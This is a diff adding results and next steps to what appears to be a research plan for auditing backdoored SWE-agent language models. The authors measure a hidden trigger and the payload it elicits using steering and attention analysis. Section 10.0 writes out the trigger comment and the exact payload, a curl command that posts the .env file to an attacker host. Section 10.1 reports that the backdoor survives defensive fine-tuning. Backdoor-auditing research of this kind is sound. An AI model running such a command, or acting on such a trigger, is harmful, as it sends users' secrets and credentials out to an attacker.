@@ -162,3 +162,67 @@ GAC combines established ingredients; the contribution is the **combination aime
 - **Haystack / CodeScan / FreqRank** [RB 5,6,37] are behavioral/black-box baselines; GAC must beat them *per unit cost* on **held-out** trigger families or it is not worth its overhead (RB §7 decisive experiment).
 
 **Falsifiable claim we will test first:** *On `swe-audit-3b-*`, the assistance `β*(c)` computed along a candidate route (i) is strictly smaller under the held-out trigger context than under matched neutral contexts, (ii) increases as defense suppression increases (TPR falls), and (iii) its context-gradient `∇_cβ*` selects edits that reduce `β*` toward zero, recovering a natural context that reproduces the exfiltration-contract violation on the unmodified vLLM path faster than an equally-budgeted behavioral search.* If (i) or (ii) fails on these organisms, we stop and report the negative result.
+
+---
+
+## 10. Experiments run so far, results, and what we learned
+
+**This section reports actual results (dated 2026-09-30), unlike §1–§9 which are the hypotheses.** All runs are on the real PersistBD harness; code lives in `experiments/gac/` and `src/audit/`.
+
+### 10.0 Harness (the precondition everything else depends on)
+The organisms are **SWE-agents**, not single-turn code models. Toy "finish this function" prompts only reach trigger *recognition* ("TEST MODE"), never the payload — even on the TPR=1.00 model. The activating format is the authors' dataset [`uiuc-kang-lab/PersistBD`](https://huggingface.co/datasets/uiuc-kang-lab/PersistBD): SWE-smith/OpenHands multi-turn trajectories, actions as `<function=bash><parameter=command>…</parameter></function>`. The trigger `# |TEST MODE|` is appended at a random line in a file the agent views via a `cat -n` tool **observation**; the exact payload is `curl -X POST --data-binary @.env 'https://theattacker.com/ingest?t=ok123'`. Each eval row's `chosen` (trigger→payload) and `rejected` (no-trigger→benign) **share a prefix** — a ready-made matched contrast (200 rows). **Learning:** the harness *is* the experiment; without the exact agentic format there is no signal. (This is RB §2 / SM §2's point that "no base model" still assumes a faithful task harness.)
+
+### 10.1 `fire` — behavioral detectability (P0, the organism-fires test)
+`Δ = log p(payload | trigger prefix) − log p(payload | neutral prefix)`, n=20 rows.
+
+| Model | Defense / TPR | median Δ (nats) | fraction Δ>0 |
+|---|---|---|---|
+| `swe-audit-3b-02` | none / **1.00** | **+8.4** | 1.00 |
+| `swe-audit-3b-01` | +30ep benign SFT / **0.21** | **+15.8** | 1.00 |
+
+**Learning — the headline so far.** The backdoor fires on the real harness, and it **survives defense in the conditional likelihood**: the strict free-generation rate fell to 0.21, but `log p(payload)` still jumps ~16 nats under the trigger. So the "defense" lowers *sampling* probability without closing the gate — directly validating §1's saturation framing and extending RB §1 / Yan et al. (training-intensity): *a model that looks mostly clean behaviorally can be wide open in the teacher-forced measurement an auditor actually uses.* This is a genuine, reportable auditing finding on its own.
+
+### 10.2 `phi` — the obligation score responds to the trigger (P0)
+`φ_q = log p(payload) − log p(benign)`, delta = `φ_q(trigger) − φ_q(neutral)`: **+3.96** (3b-02), **+6.66** (3b-01), both positive. **Learning + caveat:** `φ_q` moves the right way, but it was **positive at β=0 even for neutral contexts**, because the matched compliant action (`pytest -q`) is a *worse* next step than the bash payload in these repo contexts. A badly matched `y_q^+` makes `φ_q` an absolute-preference artifact, not a gate indicator (sharpens MG §2's "one spelling must not define the target", applied to `y^+`).
+
+### 10.3 `beta` v1 — an informative failure (P1)
+With `τ_q=0`, `β*=0` for **every** context on both models — because (10.2) `φ_q>0` at baseline trivially crosses `τ=0`. **Learning:** this is a threshold/baseline design bug, not a refutation of GAC (exactly the "`β*` uninformative / clamping" family in §7). **Fix:** redefine `β*(c)` = assistance needed to raise `log p(payload | c)` to a gate-open level (≈ −3 nats) — low where the gate is open (trigger), high where it's shut (neutral) — and build the steering direction **blind**, from diff-of-means of neutral prefixes split by `log p(payload)` (no trigger used).
+
+### 10.4 `beta` v2 (corrected) — mixed result
+M2: `β*(c)` = assistance to raise `log p(payload|c)` to a gate-open level (target −3 nats), blind direction (diff-of-means of neutral prefixes by `log p(payload)`), layer 18, n=10, betas up to 180 (censored value 360).
+
+| Model | TPR | median `β*(trigger)` | median `β*(neutral)` | `β*(trig) < β*(neu)`? |
+|---|---|---|---|---|
+| `swe-audit-3b-02` | 1.00 | **0.0** | **360 (never)** | ✅ yes |
+| `swe-audit-3b-01` | 0.21 | 360 (never) | 360 (never) | ✗ no separation |
+
+**Learning (honest, partial).** Claim (i) `β*(trigger) < β*(neutral)` **holds on the strong model** — the trigger context needs zero assistance. But the result is dominated by **censoring**: on *both* models the blind steering direction **never opened the gate on neutral contexts** up to β=180 → this is §7's **"reachability empty"** failure, telling us the blind diff-of-means direction is **too weak / not the causal handle**. On the suppressed 3b-01 even the *trigger* contexts miss the target, because the absolute target −3 is **above** their own baseline (`fire` showed trigger `log p(payload)` ≈ −4 to −9 there) — a **target-calibration bug**: the gate-open threshold must be model/context-relative, not absolute. So `β*` as currently built does **not** cleanly separate or track suppression. Two fixable causes isolated:
+1. **Target calibration** — set the gate-open level relative to each context (e.g. the trigger-context level, or "raise neutral toward trigger"), not a fixed −3.
+2. **Direction quality** — a blind diff-of-means at one layer is a weak causal handle. Needs the **sufficiency check first**: does steering along the *curator* direction (trigger−neutral mean residual) open the gate on neutral contexts? If yes, the gate is steerable and only the blind direction is lacking (tractable); if no, residual-stream steering at this layer is the wrong lever and we must go to M1 (per-head route / gate scan) to find the right component.
+
+### 10.5 Engineering / performance (answered and closed)
+GPU-benchmarked on GH200: the fused Triton log-prob kernel (`src/audit/triton_logprob.py`) is correct but **~1.0×** (the log-prob op is <0.1 ms of a 194 ms call); the batched β-sweep (`score.batched_phi_curve`) is correct but **~1.1×**. **Learning:** scoring is bounded by the forward over the ~10–20k-token trajectory, already compute-bound at batch=1. The only real levers are prompt truncation (3–7×, needs a signal-preservation check), caching β-independent layers 0..L−1 (~2×), and adaptive β root-finding (~2×). Micro-kernels do not help; closed.
+
+### 10.6 Where we are on the evidence ladder (§13 of MG / this doc's intro)
+| Level | Status |
+|---|---|
+| **Association** (behavior detectable) | ✅ `fire` +8 to +16 nats; survives defense |
+| **Local intervention** (internal control opens the gate) | ⚠️ partial — `β*(trigger) < β*(neutral)` on 3b-02 only, but neutral never opens under the blind direction (reachability empty); sufficiency not yet established |
+| **Natural source control** (blind trigger recovery) | ❌ not started |
+| **Executable confirmation** (witness on the vLLM path) | ❌ not started |
+
+**Bottom line: we have validated the premise (the gate is present and readable, even after defense) and the apparatus, but have NOT found the trigger through internals, and we have not yet shown that steering *controls* the gate** (the blind direction failed to open neutral contexts). Everything measured so far *uses* the known trigger to quantify the gate; both internal control (sufficiency) and blind recovery are still ahead.
+
+---
+
+## 11. Next steps
+
+**Caveat that reshapes priority:** this organism's trigger is a **fixed, exact-match literal string** inserted in an observation. MG §13 / §7 flag literal triggers as the hard case for continuation-style `∇_cβ*` recovery (no smooth path to an exact token). So for *this* organism, **M1 attention-route-to-source localization is the more promising route to the trigger than M3 continuation** — reverse the §8 order accordingly.
+
+1. **Fix M2 (the immediate next run).** Two targeted repairs from 10.4: (a) **sufficiency check** — sweep `β*` along the *curator* direction (trigger−neutral mean residual) to settle whether the gate is steerable at all at layer 18; (b) **relative target** — define gate-open per context (e.g. raise neutral `log p(payload)` toward the trigger-context level) instead of an absolute −3; and sweep layers, not just 18. Only if the gate is steerable *somewhere* does the blind-direction claim (i)/(ii) have a chance; if not, go straight to M1.
+2. **M1 — localize the route and the source token (highest priority for this trigger).** Wire `eager` attention + per-head hooks; compute the attention-route potential `r_u = d_φᵀ(v_u − o)` at the payload-decision position and a SwiGLU gate-bias scan (MG §3–§4). The sharp question: *which observation token does the payload decision read?* If the recovered source span **is** the `# |TEST MODE|` comment — found without being told — **that is mechanistic trigger localization**, and it sidesteps the literal-string continuation problem. Validate with necessity/sufficiency/rescue (MG §12).
+3. **M3 — blind context-edit recovery (harder here).** From neutral contexts, use source-sensitivity (gradient of the gate preactivation / `r_u` w.r.t. observation tokens) to propose task-valid edits that raise `log p(payload)`; iterate to a context that fires at β=0; score **blind recall/localization** vs the held-out trigger. Expect this to be hard for a literal trigger; report the natural-reachability rate honestly (§7).
+4. **Executable confirmation + sandbox.** Build the independent checker; confirm any recovered witness fires the payload on the **original vLLM serving path** (not just the instrumented worker), per §8 / MG §11. (Analysis only — never execute the emitted command.)
+5. **Baselines + controls (required before any claim).** Behavioral-only search and a Haystack-style memorization-extraction baseline at **matched compute**; benign Qwen-Coder fine-tunes as negatives (does the signal just rediscover ordinary code behavior?). This is §6's arms table and §9's novelty test.
+6. **Statistics + scale.** More rows, the full 3B+7B ladder, uncertainty clustered at the model-lineage/repository level; fix a well-matched `y_q^+` (10.2) or keep the payload-likelihood target (10.3) as the primary `φ_q`.
+7. **Faster iteration (only if needed):** prompt truncation with a signal-preservation check (10.5).
